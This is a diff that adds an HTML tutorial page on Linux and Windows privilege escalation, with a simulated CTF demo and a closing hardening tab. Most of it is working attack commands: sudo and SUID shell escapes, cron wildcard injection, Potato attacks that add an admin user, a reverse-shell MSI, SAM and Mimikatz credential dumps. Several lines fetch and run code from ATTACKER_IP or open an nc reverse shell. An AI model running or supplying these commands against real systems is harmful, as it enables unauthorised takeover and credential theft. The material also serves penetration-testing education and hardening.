@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>OS Privilege Escalation</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:system-ui,sans-serif;background:#0f0f11;color:#e2e2e6;padding:24px;line-height:1.6;font-size:14px}
+h1{font-size:22px;font-weight:500;margin-bottom:4px}
+.sub{color:#888;font-size:13px;margin-bottom:20px}
+.tabs{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:20px}
+.tab-btn{background:none;border:1px solid #2a2a30;padding:6px 16px;border-radius:8px;cursor:pointer;font-size:13px;color:#aaa;transition:all .15s}
+.tab-btn.active{background:#1e1e26;color:#e2e2e6;border-color:#555;font-weight:500}
+.tab-panel{display:none}.tab-panel.active{display:block}
+.code{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:12px;font-family:"Courier New",monospace;font-size:12px;line-height:1.7;color:#aaa;white-space:pre-wrap;margin:8px 0;overflow-x:auto}
+.badge{display:inline-block;font-size:11px;padding:2px 8px;border-radius:6px;font-weight:500}
+.b-red{background:#3a1515;color:#f87171}
+.b-green{background:#0f2a1a;color:#4ade80}
+.b-amber{background:#2a1d0a;color:#fbbf24}
+.b-blue{background:#0d1f3a;color:#60a5fa}
+.b-purple{background:#1e1030;color:#c084fc}
+.result-box{padding:10px 14px;border-radius:8px;font-size:13px;line-height:1.6;margin-top:8px}
+.r-red{background:#2a1010;border:1px solid #5a2020;color:#f87171}
+.r-green{background:#0d2218;border:1px solid #1a4a30;color:#4ade80}
+.r-amber{background:#2a1c08;border:1px solid #5a3a10;color:#fbbf24}
+.fix-card{background:#13131a;border-radius:8px;padding:12px 14px;margin-bottom:10px;border-left:3px solid #4ade80}
+.fix-card.danger{border-left-color:#f87171}
+.fix-card.warn{border-left-color:#fbbf24}
+.sc-card{background:#13131a;border-radius:8px;padding:12px 14px;margin-bottom:10px}
+.sc-red{border-left:3px solid #f87171}
+.sc-amber{border-left:3px solid #fbbf24}
+.sc-blue{border-left:3px solid #60a5fa}
+.sc-purple{border-left:3px solid #c084fc}
+.sc-teal{border-left:3px solid #2dd4bf}
+.step-row{display:flex;align-items:flex-start;gap:12px;padding:10px 0;border-bottom:1px solid #1e1e26}
+.step-row:last-child{border-bottom:none}
+.snum{min-width:26px;height:26px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;flex-shrink:0}
+.snum.d{background:#3a1515;color:#f87171}
+.snum.g{background:#0f2a1a;color:#4ade80}
+.snum.b{background:#0d1f3a;color:#60a5fa}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+@media(max-width:580px){.grid2{grid-template-columns:1fr}}
+input,select{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:7px 12px;color:#e2e2e6;font-size:13px;outline:none;transition:border .15s;font-family:"Courier New",monospace}
+input:focus,select:focus{border-color:#555}
+.mono-out{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:12px;font-family:"Courier New",monospace;font-size:11px;line-height:1.7;min-height:120px;overflow:auto;color:#aaa;white-space:pre-wrap}
+.chip{font-size:11px;color:#666;margin-bottom:4px}
+.preset-btn{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:5px 12px;cursor:pointer;font-size:12px;color:#aaa;transition:all .15s}
+.preset-btn:hover{border-color:#555;color:#e2e2e6}
+table{width:100%;border-collapse:collapse;font-size:12px}
+th{text-align:left;padding:8px 10px;font-weight:500;color:#888;border-bottom:1px solid #2a2a30}
+td{padding:8px 10px;border-bottom:1px solid #1e1e26;vertical-align:top}
+tr:last-child td{border-bottom:none}
+</style>
+</head>
+<body>
+<h1>OS Privilege Escalation</h1>
+<p class="sub">Post-exploitation &#183; Linux &amp; Windows &#183; Go from low-privilege shell to root/SYSTEM using misconfigurations, weak permissions, and vulnerable services</p>
+
+
+<!-- OVERVIEW -->
+<div class="tab-panel active" id="tab-overview">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">Privilege escalation moves from a limited shell to root/SYSTEM. The methodology is identical on both OSes: enumerate misconfigurations, find weak permissions, exploit trust relationships. Automated scripts do the heavy lifting — understanding the techniques lets you exploit manually when tools are blocked.</p>
+  <div style="background:#13131a;border-radius:8px;padding:12px;border:1px solid #2a2a30;margin-bottom:12px;">
+    <div style="font-size:13px;font-weight:600;color:#ccc;margin-bottom:8px;">First-steps enumeration — run immediately after getting a shell</div>
+    <div class="code">whoami &amp;&amp; id                        # who am I?
+hostname &amp;&amp; uname -a               # OS + kernel version
+sudo -l                              # what can I run as sudo?
+find / -perm -4000 2&gt;/dev/null      # SUID binaries
+cat /etc/crontab; ls /etc/cron*      # scheduled tasks
+env; cat ~/.bash_history             # env vars + previous commands
+grep -rn "password" /var/www/ /opt/ 2&gt;/dev/null  # credentials in files
+netstat -tnlp                        # internal-only services
+ps aux                               # what else runs as root?
+# Windows:
+whoami /priv                         # check SeImpersonatePrivilege
+wmic service get name,pathname       # unquoted service paths
+systeminfo                           # OS version + hotfixes</div>
+  </div>
+  <div class="grid2">
+    <div style="background:#13131a;border-radius:8px;padding:10px 14px;border:1px solid #2a2a30;">
+      <div style="font-size:12px;font-weight:600;color:#60a5fa;margin-bottom:8px;">Linux — most common paths to root</div>
+      <div style="font-size:11px;color:#888;line-height:2.1;">
+        &#9679; <span style="color:#f87171;">sudo misconfiguration</span> — sudo -l reveals exploitable binaries (GTFOBins)<br>
+        &#9679; <span style="color:#f87171;">SUID binaries</span> — shell escapes or PATH hijacking<br>
+        &#9679; <span style="color:#f87171;">Writable cron scripts</span> running as root<br>
+        &#9679; <span style="color:#fbbf24;">Credentials in config files / history</span> — password reuse<br>
+        &#9679; <span style="color:#fbbf24;">Weak file permissions</span> — world-writable sensitive files<br>
+        &#9679; <span style="color:#888;">Kernel exploits</span> — DirtyCow, DirtyPipe, PwnKit
+      </div>
+    </div>
+    <div style="background:#13131a;border-radius:8px;padding:10px 14px;border:1px solid #2a2a30;">
+      <div style="font-size:12px;font-weight:600;color:#c084fc;margin-bottom:8px;">Windows — most common paths to SYSTEM</div>
+      <div style="font-size:11px;color:#888;line-height:2.1;">
+        &#9679; <span style="color:#f87171;">SeImpersonatePrivilege</span> — Potato attacks (GodPotato)<br>
+        &#9679; <span style="color:#f87171;">Unquoted service paths</span><br>
+        &#9679; <span style="color:#f87171;">Weak service / registry permissions</span><br>
+        &#9679; <span style="color:#fbbf24;">AlwaysInstallElevated</span> — MSI installs as SYSTEM<br>
+        &#9679; <span style="color:#fbbf24;">DLL hijacking</span> in service directories<br>
+        &#9679; <span style="color:#888;">Unpatched CVEs</span> — PrintNightmare, EternalBlue
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- LINUX -->
+<div class="tab-panel" id="tab-linux">
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">&#9312; Sudo misconfiguration</span><span class="badge b-red">Check first — most common</span>
+    </div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;"><code style="font-size:11px;font-family:'Courier New',monospace">sudo -l</code> reveals what you can run as root. Almost any binary escalates via GTFOBins (gtfobins.github.io).</p>
+    <div class="code">sudo -l
+# Exploitable examples:
+(root) NOPASSWD: /usr/bin/vim     → sudo vim -c ':!/bin/bash'
+(root) NOPASSWD: /usr/bin/find    → sudo find / -exec /bin/bash \; -quit
+(root) NOPASSWD: /usr/bin/python3 → sudo python3 -c 'import os;os.system("/bin/bash")'
+(root) NOPASSWD: /usr/bin/awk     → sudo awk 'BEGIN {system("/bin/bash")}'
+(root) NOPASSWD: /usr/bin/less    → sudo less /etc/passwd  then type: !/bin/bash
+(root) NOPASSWD: /usr/bin/tar     → sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+(root) NOPASSWD: ALL              → sudo su</div>
+  </div>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">&#9313; SUID binaries + PATH hijacking</span><span class="badge b-red">High</span>
+    </div>
+    <div class="code">find / -perm -4000 -type f 2&gt;/dev/null
+# Non-standard SUID = investigate. Check what it calls:
+strings /usr/local/bin/custom_tool | grep -v "^$"
+# If calls "service" or "python" without full path:
+echo '#!/bin/bash' &gt; /tmp/service
+echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' &gt;&gt; /tmp/service
+chmod +x /tmp/service
+export PATH=/tmp:$PATH
+/usr/local/bin/custom_tool   # runs fake "service" as root!
+/tmp/rootbash -p             # root shell</div>
+  </div>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">&#9314; Cron job exploitation</span><span class="badge b-red">High</span>
+    </div>
+    <div class="code">cat /etc/crontab; ls /etc/cron.d/
+# Scenario 1: writable script
+* * * * * root /opt/cleanup.sh
+ls -la /opt/cleanup.sh   # -rwxrwxrwx = world-writable!
+echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' &gt;&gt; /opt/cleanup.sh
+# wait 60s, then: /tmp/rb -p
+
+# Scenario 2: wildcard injection (tar *)
+* * * * * root cd /backups &amp;&amp; tar czf backup.tgz *
+echo '' &gt; '/backups/--checkpoint=1'
+echo '' &gt; '/backups/--checkpoint-action=exec=sh privesc.sh'
+echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' &gt; /backups/privesc.sh
+
+# pspy64 — monitor cron WITHOUT root
+./pspy64   # shows every root process with timestamps</div>
+  </div>
+
+  <div class="sc-card sc-amber" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">&#9315; Credentials in files &amp; history</span><span class="badge b-amber">Always check</span>
+    </div>
+    <div class="code">cat ~/.bash_history
+grep -rn "password\|DB_PASS\|secret" /var/www/ /opt/ /home/ 2&gt;/dev/null
+cat /var/www/html/wp-config.php
+cat /var/www/html/.env
+find / -name "id_rsa" -o -name "*.pem" 2&gt;/dev/null
+
+# Test found password everywhere — password reuse is very common:
+su - root        # try it
+sudo -s          # try it
+ssh root@localhost</div>
+  </div>
+
+  <div class="sc-card sc-purple">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">&#9316; Kernel exploits</span><span class="badge b-purple">High impact — use carefully</span>
+    </div>
+    <div class="code">uname -a   # get exact kernel version
+# Notable CVEs:
+# DirtyCow   CVE-2016-5195 — kernel &lt; 4.8.3
+# DirtyPipe  CVE-2022-0847 — kernel 5.8–5.16.11
+# PwnKit     CVE-2021-4034 — pkexec on ANY distro
+# Baron Samedit CVE-2021-3156 — sudo heap overflow
+
+which pkexec &amp;&amp; pkexec --version   # if present → likely PwnKit-vulnerable
+searchsploit "Linux Kernel 5.15"   # find PoCs by version
+# Warning: kernel exploits can crash targets — use in labs/CTF</div>
+  </div>
+</div>
+
+<!-- WINDOWS -->
+<div class="tab-panel" id="tab-windows">
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">&#9312; SeImpersonatePrivilege — Potato attacks</span><span class="badge b-red">Common on service accounts</span>
+    </div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">IIS, MSSQL, and service accounts almost always have this privilege. Potato attacks forge a SYSTEM token.</p>
+    <div class="code">whoami /priv
+# Look for: SeImpersonatePrivilege = Enabled
+
+# GodPotato — works Windows Server 2012 through 2022
+GodPotato.exe -cmd "cmd /c net user hacker Pass123! /add"
+GodPotato.exe -cmd "cmd /c net localgroup Administrators hacker /add"
+
+# PrintSpoofer — Windows 10 / Server 2019+
+PrintSpoofer.exe -i -c cmd.exe
+
+# JuicyPotato — Windows Server 2016 and below
+JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t *</div>
+  </div>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">&#9313; Unquoted service paths</span><span class="badge b-red">Very common</span>
+    </div>
+    <div class="code">wmic service get name,pathname
+# Look for paths with spaces but NO quotes
+# e.g.: C:\Program Files\My App\svc.exe  (vulnerable)
+# vs:   "C:\Program Files\My App\svc.exe"  (safe)
+
+# Windows tries paths in order:
+# C:\Program.exe          &lt;-- if writable, place payload here
+# C:\Program Files\My.exe &lt;-- or here
+
+icacls "C:\Program Files"   # check write permissions
+# If writable: copy shell.exe "C:\Program Files\My.exe"
+sc stop VulnSvc &amp;&amp; sc start VulnSvc   # trigger SYSTEM execution</div>
+  </div>
+
+  <div class="sc-card sc-amber" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">&#9314; Weak service/registry permissions</span><span class="badge b-amber">High</span>
+    </div>
+    <div class="code">accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula
+# If service binary is writable — replace with payload
+# If service registry key is writable:
+reg add HKLM\SYSTEM\CurrentControlSet\Services\VulnSvc /v ImagePath /t REG_EXPAND_SZ /d "C:\Windows\Temp\shell.exe" /f
+sc stop VulnSvc &amp;&amp; sc start VulnSvc</div>
+  </div>
+
+  <div class="sc-card sc-amber" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">&#9315; AlwaysInstallElevated</span><span class="badge b-amber">Easy when present</span>
+    </div>
+    <div class="code">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+# If both = 0x1 → MSI installs run as SYSTEM for any user
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi -o shell.msi
+msiexec /quiet /qn /i C:\Windows\Temp\shell.msi</div>
+  </div>
+
+  <div class="sc-card sc-purple">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">&#9316; Stored credentials &amp; SAM dump</span><span class="badge b-purple">Medium</span>
+    </div>
+    <div class="code">cmdkey /list   # Windows Credential Manager stored creds
+# From admin shell — dump SAM:
+reg save HKLM\SAM sam.bak &amp;&amp; reg save HKLM\SYSTEM system.bak
+secretsdump.py -sam sam.bak -system system.bak LOCAL
+# Gets NTLM hashes → crack or Pass-the-Hash
+
+# Mimikatz (from admin shell):
+privilege::debug
+sekurlsa::logonpasswords   # dump all cached creds in memory</div>
+  </div>
+</div>
+
+<!-- DEMO -->
+<div class="tab-panel" id="tab-demo">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">Simulate discovering and exploiting a privilege escalation vector.</p>
+  <div style="margin-bottom:10px;">
+    <div class="chip">Scenario</div>
+    <select id="privesc-select" onchange="runDemo()" style="width:100%;font-family:system-ui;">
+      <option value="sudo_vim">Linux — sudo vim GTFOBins escape</option>
+      <option value="suid">Linux — custom SUID binary PATH hijack</option>
+      <option value="cron">Linux — writable cron script</option>
+      <option value="creds">Linux — password reuse from config file</option>
+      <option value="potato">Windows — SeImpersonatePrivilege (GodPotato)</option>
+      <option value="unquoted">Windows — unquoted service path</option>
+    </select>
+  </div>
+  <div style="margin-bottom:8px;">
+    <div class="chip">Enumeration — what attacker finds</div>
+    <div class="mono-out" id="enum-out" style="min-height:80px;"></div>
+  </div>
+  <div class="grid2">
+    <div><div class="chip">Exploitation</div><div class="mono-out" id="exploit-out" style="min-height:110px;"></div></div>
+    <div><div class="chip">Result</div><div class="mono-out" id="result-out" style="min-height:110px;"></div></div>
+  </div>
+  <div id="demo-verdict" class="result-box" style="margin-top:10px;"></div>
+</div>
+
+<!-- TOOLS -->
+<div class="tab-panel" id="tab-tools">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">Run automated enumeration immediately after getting a shell — these scripts cover hundreds of checks in seconds.</p>
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">LinPEAS — Linux Privilege Escalation Awesome Script</div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">250+ checks, colour-coded (red = critical). The single most important Linux privesc tool.</p>
+    <div class="code">curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+# No internet? Transfer from attacker:
+# Attacker: python3 -m http.server 8080
+curl http://ATTACKER_IP:8080/linpeas.sh | sh 2&gt;&amp;1 | tee /tmp/lp.txt
+# RED = critical, YELLOW = interesting — check these first</div>
+  </div>
+  <div class="sc-card sc-purple" style="margin-bottom:10px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:6px;">WinPEAS + supporting tools</div>
+    <div class="code">.\winPEASx64.exe
+# PowerShell (no binary):
+IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8080/winPEAS.ps1')
+
+# Additional tools:
+pspy64                    # Linux: monitor all processes WITHOUT root — reveals cron
+linux-exploit-suggester   # Linux: kernel exploit suggestions by version
+PowerUp.ps1 Invoke-AllChecks  # Windows: common misconfiguration checks
+accesschk.exe             # Windows: check permissions on services/files/registry</div>
+  </div>
+  <div style="background:#13131a;border-radius:8px;padding:10px 14px;border:1px solid #2a2a30;">
+    <div style="font-size:12px;font-weight:600;color:#ccc;margin-bottom:6px;">Reference databases (bookmark these)</div>
+    <div style="font-size:12px;color:#888;line-height:1.9;">
+      <strong style="color:#60a5fa;">gtfobins.github.io</strong> — Linux: shell escapes for every binary that can appear in sudo/SUID &nbsp;·&nbsp;
+      <strong style="color:#c084fc;">lolbas-project.github.io</strong> — Windows: living-off-the-land binaries for lateral movement and privesc
+    </div>
+  </div>
+</div>
+
+<!-- HARDENING -->
+<div class="tab-panel" id="tab-fix">
+  <div class="fix-card danger">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9312; Restrict sudo to exact commands needed <span class="badge b-red">Highest Linux impact</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">Never grant NOPASSWD: ALL. Any interpreter, text editor, or system tool in sudoers is a GTFOBins escape waiting to happen.</div>
+    <div class="code"># BAD:
+www-data ALL=(ALL) NOPASSWD: ALL
+# GOOD — exact absolute path only:
+www-data ALL=(root) NOPASSWD: /usr/bin/certbot renew --quiet
+# High-risk in sudoers: vim nano python perl ruby awk find tar less more man zip</div>
+  </div>
+  <div class="fix-card">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9313; Audit SUID binaries and cron permissions <span class="badge b-green">Essential</span></div>
+    <div class="code"># Audit SUID
+find / -perm -4000 -type f 2&gt;/dev/null | xargs ls -la
+chmod u-s /usr/bin/nmap   # remove where not needed
+
+# Cron scripts must be root-owned and not world-writable
+chmod 700 /opt/scripts/cleanup.sh
+chown root:root /opt/scripts/cleanup.sh</div>
+  </div>
+  <div class="fix-card">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9314; Windows — fix service misconfigs <span class="badge b-green">Essential</span></div>
+    <div class="code"># Quote all service paths
+sc config VulnSvc binPath= "\"C:\Program Files\My App\svc.exe\""
+
+# Disable AlwaysInstallElevated
+reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 0 /f
+reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 0 /f
+
+# Keep patched — Potato attacks are mitigated on modern patched Windows
+# Restrict SeImpersonatePrivilege to actual service accounts via Group Policy</div>
+  </div>
+  <div class="fix-card warn">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">&#9315; Ongoing hardening</div>
+    <div style="font-size:12px;color:#888;line-height:1.9;">
+      Run LinPEAS/WinPEAS on your own systems quarterly &nbsp;·&nbsp;
+      No plaintext credentials in config files — use secrets managers &nbsp;·&nbsp;
+      Service accounts: minimal OS privileges, no admin group membership &nbsp;·&nbsp;
+      Enable auditd (Linux) / Windows Event Log 4688 — log all process execution &nbsp;·&nbsp;
+      Patch kernels and OS promptly — most kernel exploits have CVEs with available patches
+    </div>
+  </div>
+</div>
+
+<script>
+function showTab(id,btn){
+  document.querySelectorAll('.tab-panel').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById('tab-'+id).classList.add('active');
+  btn.classList.add('active');
+}
+const SC={
+  sudo_vim:{
+    e:'$ sudo -l\nUser www-data may run:\n    (root) NOPASSWD: /usr/bin/vim\n\n$ id\nuid=33(www-data) gid=33(www-data)',
+    x:'# GTFOBins — vim shell escape\nsudo vim -c \':!/bin/bash\'\n# vim runs as root via sudo\n# :!/bin/bash spawns a root shell\n# Works with any editor in sudoers',
+    r:'root@target:/var/www/html# id\nuid=0(root) gid=0(root) groups=0(root)\n\nroot@target:~# cat /root/root.txt\nFLAG{sudo_v1m_gtf0bins_r00t}',
+    v:'<strong>Root via sudo vim!</strong> The sudoers file allowed www-data to run vim as root without a password. The GTFOBins escape <code>:!/bin/bash</code> spawned a root shell. Check gtfobins.github.io for the escape technique for any binary in <code>sudo -l</code> output.'
+  },
+  suid:{
+    e:'$ find / -perm -4000 -type f 2>/dev/null\n/usr/bin/passwd\n/usr/bin/su\n/usr/local/bin/backup_tool   &lt;-- non-standard!\n\n$ strings /usr/local/bin/backup_tool\n...\nservice rsync start\n# Calls "service" without full path!',
+    x:'# Create malicious "service" in /tmp\necho \'#!/bin/bash\' > /tmp/service\necho \'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\' >> /tmp/service\nchmod +x /tmp/service\nexport PATH=/tmp:$PATH\n/usr/local/bin/backup_tool\n# SUID binary runs our fake "service" as root!',
+    r:'$ ls -la /tmp/rootbash\n-rwsr-xr-x 1 root root /tmp/rootbash\n\n$ /tmp/rootbash -p\nrootbash-5.1# id\nuid=1001(alice) euid=0(root)\n\nrootbash-5.1# cat /root/root.txt\nFLAG{su1d_path_h1j4ck_r00t}',
+    v:'<strong>Root via SUID PATH hijacking!</strong> The custom SUID binary called "service" without a full path. Placing a malicious script named "service" in /tmp and prepending to PATH caused the SUID binary to execute it as root — creating a SUID bash copy.'
+  },
+  cron:{
+    e:'$ cat /etc/crontab\n* * * * * root /opt/cleanup.sh\n\n$ ls -la /opt/cleanup.sh\n-rwxrwxrwx 1 root root  &lt;-- world-writable!\n\n# pspy64 confirms:\n2026/03/29 10:01:01 CMD: UID=0 | /bin/bash /opt/cleanup.sh',
+    x:'# Append payload to writable root cron script\necho \'cp /bin/bash /tmp/rb; chmod +s /tmp/rb\' >> /opt/cleanup.sh\n# Wait up to 60 seconds for cron to fire...\n# pspy64 shows execution in real time',
+    r:'$ ls -la /tmp/rb\n-rwsr-xr-x 1 root root /tmp/rb\n\n$ /tmp/rb -p\nrb-5.1# id\nuid=1001(alice) euid=0(root)\n\nrb-5.1# cat /root/root.txt\nFLAG{wr1t4bl3_cr0n_scr1pt_r00t}',
+    v:'<strong>Root via writable cron script!</strong> The root cron job executed a world-writable script every minute. Appending a payload created a SUID bash copy on the next run. pspy64 is critical here — it reveals what root runs every minute without needing root access yourself.'
+  },
+  creds:{
+    e:'$ grep -rn "password" /var/www/ 2>/dev/null\n/var/www/html/config.php: $db_pass = \'SuperSecretDB2024!\';\n\n$ cat ~/.bash_history\nmysql -u root -pSuperSecretDB2024!\nsudo su',
+    x:'# Test found password on su (password reuse!)\nsu - root\nPassword: SuperSecretDB2024!\n\n# Or via MySQL if running as root:\nmysql -u root -p"SuperSecretDB2024!"\nmysql> \\! /bin/bash',
+    r:'root@target:~# id\nuid=0(root) gid=0(root) groups=0(root)\n\nroot@target:~# cat /root/root.txt\nFLAG{p4ssw0rd_reus3_str1kes_4g41n}\n\n# Password reuse: always test found creds on su/sudo/ssh',
+    v:'<strong>Root via credential reuse!</strong> The database password found in a PHP config file was reused as the root system password. Always test any credentials found (config files, history, .env) against su/sudo/ssh — password reuse is extremely common in real environments.'
+  },
+  potato:{
+    e:'C:\\> whoami\niis apppool\\defaultapppool\n\nC:\\> whoami /priv\nSeImpersonatePrivilege    Enabled\n\n# IIS/MSSQL service accounts almost always\n# have this privilege — Potato attacks work!',
+    x:'# Transfer GodPotato\ncertutil.exe -urlcache -f http://ATTACKER_IP:8080/GodPotato.exe C:\\Windows\\Temp\\gp.exe\n\nC:\\Windows\\Temp\\gp.exe -cmd "cmd /c net user hacker Pass123! /add"\nC:\\Windows\\Temp\\gp.exe -cmd "cmd /c net localgroup Administrators hacker /add"\n# Or reverse shell:\nC:\\Windows\\Temp\\gp.exe -cmd "cmd /c nc.exe ATTACKER_IP 4444 -e cmd.exe"',
+    r:'nc -lvnp 4444\nConnection received from 203.0.113.50\n\nC:\\Windows\\system32> whoami\nnt authority\\system\n\nC:\\> type C:\\Users\\Administrator\\Desktop\\root.txt\nFLAG{g0dp0t4t0_s3imp3rs0n4t3_syst3m}',
+    v:'<strong>SYSTEM via GodPotato!</strong> The IIS service account had SeImpersonatePrivilege — standard for web service accounts. GodPotato exploited Windows authentication to forge a SYSTEM token. Works on Windows Server 2012 through 2022.'
+  },
+  unquoted:{
+    e:'C:\\> wmic service get name,pathname\nBackupSvc    C:\\Program Files\\Backup Tool\\bin\\svc.exe\n# No quotes + has spaces = vulnerable!\n\nC:\\> icacls "C:\\Program Files\\Backup Tool"\nBUILTIN\\Users:(OI)(CI)(M)  &lt;-- Modify access!',
+    x:'# Create malicious binary at an earlier path Windows will try first\ncertutil -urlcache -f http://ATTACKER_IP:8080/shell.exe "C:\\Program Files\\Backup.exe"\n\n# Start listener, restart service:\nsc stop BackupSvc\nsc start BackupSvc\n# Windows executes Backup.exe as SYSTEM before real binary!',
+    r:'nc -lvnp 4444\nConnection received from 203.0.113.50\n\nC:\\Windows\\system32> whoami\nnt authority\\system\n\nC:\\> type C:\\Users\\Administrator\\Desktop\\root.txt\nFLAG{unqu0t3d_s3rv1c3_2_SYST3M}',
+    v:"<strong>SYSTEM via unquoted service path!</strong> The service path had spaces and wasn't quoted. Windows tried C:\\Program Files\\Backup.exe before the real binary. Since Users had Modify rights on that directory, placing a malicious binary there was enough. Service restart = SYSTEM shell."
+  }
+};
+function runDemo(){
+  const k=document.getElementById('privesc-select').value;
+  const s=SC[k];
+  document.getElementById('enum-out').innerHTML='<span style="color:#60a5fa">'+s.e+'</span>';
+  document.getElementById('exploit-out').innerHTML='<span style="color:#fbbf24">'+s.x+'</span>';
+  document.getElementById('result-out').innerHTML='<span style="color:#f87171">'+s.r+'</span>';
+  const v=document.getElementById('demo-verdict');
+  v.className='result-box r-red';
+  v.innerHTML=s.v;
+}
+runDemo();
+</script>
+
+</body>
+</html><!-- TAB BUTTONS -->
+<div class="tabs">
+  <button class="tab-btn active" onclick="showTab('overview',this)">Overview</button>
+  <button class="tab-btn" onclick="showTab('linux',this)">Linux privesc</button>
+  <button class="tab-btn" onclick="showTab('windows',this)">Windows privesc</button>
+  <button class="tab-btn" onclick="showTab('demo',this)">Live demo</button>
+  <button class="tab-btn" onclick="showTab('tools',this)">Automation tools</button>
+  <button class="tab-btn" onclick="showTab('fix',this)">Hardening</button>
+</div>
